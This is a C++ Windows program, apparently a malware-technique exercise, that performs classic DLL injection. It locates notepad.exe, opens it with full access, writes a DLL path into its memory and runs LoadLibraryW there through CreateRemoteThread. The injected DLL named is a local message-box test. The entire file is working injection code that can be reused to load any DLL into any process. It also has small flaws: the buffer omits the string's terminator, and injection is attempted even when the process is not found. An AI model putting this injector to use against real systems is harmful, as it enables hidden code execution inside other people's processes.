#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

BOOL GetRemoteProcessHandle(IN LPCWSTR ProcessName, OUT DWORD* ProcessId, OUT HANDLE* Process) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot() failed: %d\n", GetLastError());
        return FALSE;
    }

    if (!Process32First(snapshot, &entry)) {
        printf("[!] Process32First() failed: %d\n", GetLastError());
        CloseHandle(snapshot);
        return FALSE;
    }

    do {
        if (_wcsicmp(entry.szExeFile, ProcessName) == 0) { // Case-insensitive comparison
            printf("[+] ProcessName: %ws\n", entry.szExeFile);
            *ProcessId = entry.th32ProcessID;
            *Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
            if (*Process == NULL) {
                printf("[!] OpenProcess() failed: %d\n", GetLastError());
                CloseHandle(snapshot);
                return FALSE;
            }
            CloseHandle(snapshot);
            return TRUE;
        }
    } while (Process32Next(snapshot, &entry));

    CloseHandle(snapshot);
    return FALSE;
}

BOOL RemoteInjectDLL(IN HANDLE process, IN LPCWSTR DLLName) {

    LPVOID LoadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (LoadLibraryAddr == NULL) {
        printf("[!] GetProcAddress failed: %d\n", GetLastError());
        return FALSE;
    }

    LPVOID RemoteMemory = VirtualAllocEx(process, NULL, wcslen(DLLName) * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (RemoteMemory == NULL) {
        printf("[!] VirtualAllocEx failed: %d\n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(process, RemoteMemory, DLLName, wcslen(DLLName) * 2, NULL)) {
        printf("[!] WriteProcessMemory failed: %d\n", GetLastError());
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryAddr, RemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread failed: %d\n", GetLastError());
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(process, RemoteMemory, 0, MEM_RELEASE);

    return TRUE;
}


int main() {
    HANDLE hProcess = NULL;
    DWORD ProcessId = 0;

    if (GetRemoteProcessHandle(L"notepad.exe", &ProcessId, &hProcess)) {
        printf("[+] Found ProcessId: %d\n", ProcessId);
    }
    else {
        printf("[!] GetRemoteProcessHandle() failed\n");
    }

    if (!RemoteInjectDLL(hProcess, L"C:\\malttps\\dll_injection\\x64\\Debug\\dll_messagebox.dll")) {
        return -1;
    }
    getchar();
    return 0;
}
